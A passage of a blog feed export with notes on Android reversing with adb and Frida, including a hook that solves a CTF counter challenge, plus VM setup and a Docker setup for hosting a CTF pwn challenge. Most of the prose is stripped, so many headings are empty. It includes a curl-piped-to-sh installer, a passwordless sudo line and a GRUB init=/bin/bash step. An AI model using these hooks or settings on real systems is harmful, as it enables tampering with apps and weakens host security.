class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">adb connect &lt;ip&gt;:&lt;port&gt;</span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">adb disconnect &lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure><ul><li>activity</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n &lt;package&gt;/&lt;activity&gt; </span><br></pre></td></tr></table></figure><h2 id="frida-"><a href="#frida-" class="headerlink" title="frida "></a>frida </h2><ul><li><p>python  frida-tools   server , python venv</p></li><li><p>CPU </p></li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure><ul><li>hook </li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">frida -U -l hook.js -f com.package.name --no-pause</span><br></pre></td></tr></table></figure><ul><li>python </li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># frida-ps -Ua pid</span></span><br><span class="line">process = device.attach(<span class="number">8189</span>)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;hook.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send js</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  jscode = f.readall()</span><br><span class="line">  hook = process.create_script(jscode)</span><br><span class="line">hook.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()  <span class="comment"># Androidhook</span></span><br></pre></td></tr></table></figure><h3 id="hook-java"><a href="#hook-java" class="headerlink" title="hook java"></a>hook java</h3><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Java.perform(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">stringClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.util.String&quot;</span>);</span><br></pre></td></tr></table></figure><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line">stringClass.$<span class="keyword">new</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line">Java.choose(<span class="string">&#x27;java.lang.String&#x27;</span>, &#123;  </span><br><span class="line">        onMatch: function(instance)&#123;  </span><br><span class="line">        console.log(<span class="string">&#x27;String instance is:&#x27;</span>, instance);  </span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: function()&#123;</span><br><span class="line">        console.log(<span class="string">&#x27;search complete!&#x27;</span>);</span><br><span class="line">    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// </span></span><br><span class="line">className.&lt;method&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// </span></span><br><span class="line"><span class="comment">// 1. </span></span><br><span class="line"><span class="comment">// 2. new</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">&lt;class&gt;.&lt;<span class="keyword">var</span>&gt;.value = xxx;</span><br></pre></td></tr></table></figure><p>hook java method</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&lt;class&gt;.&lt;method&gt;.implementation = function(arg...) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// :  class </span></span><br><span class="line">&lt;class&gt;.&lt;method&gt;.overload([TYPE], [TYPE]).implementation = function(args...)&#123; </span><br><span class="line"><span class="comment">// do sth </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//  hook $init</span></span><br><span class="line">StringBuilder.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = function (arg) &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">partial</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.$init(arg);</span><br><span class="line">    <span class="keyword">if</span> (arg !== <span class="literal">null</span>) &#123;</span><br><span class="line">         partial = arg.toString().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).slice(<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(&#x27;new StringBuilder(java.lang.String); =&gt; &#x27; + result)</span></span><br><span class="line">    console.log(<span class="string">&#x27;new StringBuilder(&quot;&#x27;</span> + partial + <span class="string">&#x27;&quot;);&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id="newstartCTF-2023-lazyactivity"><a href="#newstartCTF-2023-lazyactivity" class="headerlink" title="newstartCTF 2023 lazyactivity"></a>newstartCTF 2023 lazyactivity</h3><p>activity</p><ul><li>MainActivity</li><li>FlagActivity</li></ul><p>MainActivityFlagActivity</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivit</span><br></pre></td></tr></table></figure><p>FlagActivity 10000hook <code>access$004</code> 10000(cnt+&#x3D;1, hook10001)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="type">int</span> access$<span class="number">004</span>(FlagActivity flagActivity) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> flagActivity.cnt + <span class="number">1</span>;</span><br><span class="line">        flagActivity.cnt = i;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(C0535R.layout.layout_2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(C0535R.C0538id.textView2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(C0535R.C0538id.editTextTextPersonName2);</span><br><span class="line">        ((Button) findViewById(C0535R.C0538id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.droidlearn.activity_travel.FlagActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><del>10000bushi</del></p><p>hook.py</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">3157</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># hooook.js</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lazy_activity.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">  script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure><p>hook.js</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">  <span class="comment">//implementation</span></span><br><span class="line">  my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">    <span class="comment">//</span></span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>python</p>]]></content>
      
      
      <categories>
          
          <category> REVERSE </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title></title>
      <link href="/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/"/>
      <url>/2023/09/17/%E8%99%9A%E6%8B%9F%E6%9C%BA%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h2 id="zsh"><a href="#zsh" class="headerlink" title="zsh"></a>zsh</h2><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zsh</span><br><span class="line"></span><br><span class="line">chsh -s /bin/zsh</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">&quot;<span class="subst">$(curl -fsSL https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh)</span>&quot;</span></span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-syntax-highlighting.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-syntax-highlighting</span><br><span class="line">git <span class="built_in">clone</span> https://github.com/zsh-users/zsh-autosuggestions <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh&#125;</span>/plugins/zsh-autosuggestions</span><br></pre></td></tr></table></figure><p>zshrc</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">plugins=(</span><br><span class="line">git </span><br><span class="line">zsh-syntax-highlighting </span><br><span class="line">zsh-autosuggestions</span><br><span class="line">)</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> --depth=1 https://github.com/romkatv/powerlevel10k.git <span class="variable">$&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;</span>/themes/powerlevel10k</span><br><span class="line"></span><br><span class="line"><span class="comment"># zshrc</span></span><br><span class="line">ZSH_THEME=powerlevel10k/powerlevel10k</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p> ttf  </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line"><span class="built_in">mkdir</span> -p ~/.fonts</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">/usr/share/fonts</span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo mkfontscale</span><br><span class="line">sudo mkfontdir</span><br><span class="line">sudo fc-cache</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><p></p><h3 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h3><p>mount</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;fstab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.host:/ /mnt/hgfs fuse.vmhgfs-fuse allow_other 0 0</span><br></pre></td></tr></table></figure><h3 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h3><p>mount</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo mount -t fuse.vmhgfs-fuse .host:/ /mnt/hgfs -o allow_other</span><br></pre></td></tr></table></figure><p>&#x2F;etc&#x2F;fstab</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmhgfs-fuse /mnt/hgfs/ fuse defaults,allow_other 0 0</span><br></pre></td></tr></table></figure><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br><span class="line">sudo apt install docker-compose</span><br></pre></td></tr></table></figure><p>docker</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo usermod -aG docker <span class="variable">$USER</span>  </span><br><span class="line">newgrp docker</span><br><span class="line">sudo systemctl restart docker</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li>IP</li></ul><ol><li>kali  <code>/etc/network/interfaces</code></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">ifconfig</span><br><span class="line"></span><br><span class="line"><span class="comment">#  interfaces </span></span><br><span class="line">auto eth0</span><br><span class="line">iface eth0 inet dhcp</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">/etc/init.d/networkingrestart</span><br><span class="line">ifconfigeth0 down    </span><br><span class="line">ifconfigeth0 up</span><br></pre></td></tr></table></figure><ol start="2"><li>ubuntu </li></ol><ul><li>ifconfig IP</li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ifconfig ens33 &lt;IP&gt; netmask &lt;mask&gt;</span><br><span class="line">route add default gw &lt;gateway&gt;</span><br></pre></td></tr></table></figure><ul><li></li></ul><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo /sbin/dhclient</span><br></pre></td></tr></table></figure><ol start="3"><li>ubuntu  </li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">sudo vim /etc/netplan/01-network-manager-all.yaml</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">network:</span><br><span class="line">  version: 2</span><br><span class="line">  renderer: NetworkManager</span><br><span class="line">  ethernets:</span><br><span class="line">     eth0:</span><br><span class="line">       dhcp4: <span class="built_in">yes</span></span><br><span class="line">       addresses: []</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">sudo netplan try</span><br><span class="line">sudo netplan apply</span><br></pre></td></tr></table></figure><ul><li> <code>/etc/NetworkManager/NetworkManager.conf</code>  <code>managed = true</code></li><li>reboot</li><li> <a href="https://www.zhangguojian.com/2020/11/27/ubuntu-vmware-workstation-can-not-connect-network/#%E6%89%8B%E5%8A%A8%E8%8E%B7%E5%8F%96-ip">Ubuntu20.04 ip </a></li></ul><ol start="4"><li></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo nmcli networking off </span><br><span class="line">sudo nmcli networking on</span><br></pre></td></tr></table></figure><h2 id="sudo-"><a href="#sudo-" class="headerlink" title="sudo "></a>sudo </h2><p> <code>/etc/sudoers</code> </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># </span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:/bin/useradd,/bin/chown</span><br><span class="line"></span><br><span class="line"><span class="comment"># </span></span><br><span class="line">&lt;name&gt; ALL=(ALL:ALL) NOPASSWD:ALL</span><br></pre></td></tr></table></figure><h2 id=""><a href="#" class="headerlink" title=""></a></h2><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p><strong></strong>VM</p><ul><li><a href="https://kb.vmware.com/s/article/1023657?lang=zh_CN">(vmware.com)</a></li></ul><p>vmdkshrink</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ sudo vmware-toolbox-cmd disk list</span><br><span class="line">$ sudo vmware-toolbox-cmd disk shrink /</span><br></pre></td></tr></table></figure><p></p><h2 id="kali-console"><a href="#kali-console" class="headerlink" title="kali console"></a>kali console</h2><ul><li> fstab  fstab</li></ul><ol><li> grub</li><li>e </li><li> linux  ro &#x3D;&gt; <code>rw</code>  <code>init=/bin/bash</code></li><li>f10 </li><li> fstab</li></ol><h2 id=""><a href="#" class="headerlink" title=""></a></h2><ul><li><a href="https://github.com/ohmyzsh/ohmyzsh/wiki/Plugins">Plugins  ohmyzsh&#x2F;ohmyzsh Wiki</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> CS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> VM </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTF</title>
      <link href="/2023/09/16/CTF%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/"/>
      <url>/2023/09/16/CTF%E5%87%BA%E9%A2%98%E7%8E%AF%E5%A2%83/</url>
      
        <content type="html"><![CDATA[<blockquote><p></p></blockquote><span id="more"></span><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><ol><li>docker</li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install docker.io</span><br></pre></td></tr></table></figure><ol start="2"><li></li></ol><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">chall</span><br><span class="line"> flag.txt</span><br><span class="line"> vuln</span><br><span class="line"> vuln.c</span><br><span class="line"> Makefile</span><br></pre></td></tr></table></figure><ol start="3"><li>docker  Dockerfile xinetd<ul><li></li></ul></li></ol><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> ubuntu:<span class="number">20.04</span></span><br><span class="line"><span class="keyword">ENV</span> DEBIAN_FRONTEND noninteractive</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y update --fix-missing &amp;&amp; apt-get -y dist-upgrade</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> apt-get -y install lib32z1 xinetd</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> groupadd -r pwn &amp;&amp; useradd -r -g pwn pwn</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;#!/bin/bash\n    \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">service xinetd restart &amp;&amp; /bin/sleep infinity&#x27;</span> &gt; /etc/init.sh</span></span><br><span class="line"></span><br><span class="line"><span class="comment">###### change server</span></span><br><span class="line"><span class="keyword">RUN</span><span class="language-bash"> <span class="built_in">echo</span> <span class="string">&#x27;service pwn\n       \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">&#123;\n                           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  type = UNLISTED\n           \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  disable = no\n              \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  socket_type = stream\n      \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  protocol = tcp\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  wait = no\n                 \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  user = pwn\n                \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  bind = 0.0.0.0\n            \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  port = 9999\n               \</span></span></span><br><span class="line"><span class="string"><span class="language-bash">  server = /home/pwn/vuln\n   \         </span></span></span><br><span class="line">&#125;<span class="string">&#x27; &gt; /etc/xinetd.d/pwn</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chmod 500 /etc/init.sh</span></span><br><span class="line"><span class="string">RUN chmod 444 /etc/xinetd.d/pwn </span></span><br><span class="line"><span class="string">RUN chmod 1733 /tmp /var/tmp /dev/shm</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">ADD chall/flag.txt /flag.txt            ####### change flag</span></span><br><span class="line"><span class="string">RUN chmod 444 /flag.txt               </span></span><br><span class="line"><span class="string">RUN mv /flag.txt /flag-$(md5sum flag.txt | awk &#x27;</span>&#123;print $<span class="number">1</span>&#125;<span class="string">&#x27;).txt</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">WORKDIR /home/pwn</span></span><br><span class="line"><span class="string">ADD chall/vuln .                        ###### change chall file</span></span><br><span class="line"><span class="string">RUN chmod 550 vuln</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">RUN chown -R root:pwn /home/pwn</span></span><br><span class="line"><span class="string">RUN service xinetd restart</span></span><br></pre></td></tr></table></figure><ol start="4"><li>docker-compose.yml<ul><li></li></ul></li></ol><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">version:</span> <span class="string">&#x27;3&#x27;</span></span><br><span class="line"><span class="attr">services:</span></span><br><span class="line">  <span class="attr">vuln:</span>                       <span class="comment"># change name</span></span><br><span class="line">    <span class="attr">build:</span> <span class="string">.</span></span><br><span class="line">    <span class="attr">ulimits:</span></span><br><span class="line">      <span class="attr">nproc:</span> <span class="number">65535</span></span><br><span class="line">      <span class="attr">core:</span> <span class="number">0</span></span><br><span class="line">    <span class="attr">ports:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;1234:9999&quot;</span>           <span class="comment"># change port</span></span><br><span class="line">    <span class="attr">entrypoint:</span> <span class="string">/etc/init.sh</span></span><br><span class="line">    <span class="attr">restart:</span> <span class="string">unless-stopped</span></span><br></pre></td></tr></table></figure><p></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose 